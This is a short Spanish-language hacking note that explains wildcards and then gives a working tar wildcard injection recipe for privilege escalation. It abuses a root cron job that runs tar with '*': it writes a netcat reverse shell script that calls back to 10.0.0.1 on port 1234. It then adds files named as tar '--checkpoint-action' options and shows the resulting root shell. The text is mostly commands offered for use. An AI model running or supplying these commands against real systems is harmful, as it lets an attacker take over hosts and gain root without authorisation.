Wildcards


Los wildcards son caracteres que representan un conjunto o rango. Con ellos se construyen las expresiones regulares. Suelen denominarse también caracteres comodín

TAR WILDCARD

Si tenemos un cron que realize lo siguiente podremos usar un wildcard para tar

cd /var/log/mon && tar -zcf /tmp/mon.tar.gz *


Si queremos crear una REVERSE SHELL hariamos lo siguiente en el directorio donde el cron hace el tar.gz y con nuestra maquina atacante escuchando nos conectariamos

root@box$ cd /var/log/mon
root@box$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1


user@box$ nc -lvnp 1234
# id
uid=0(root) gid=0(root) groups=0(root)
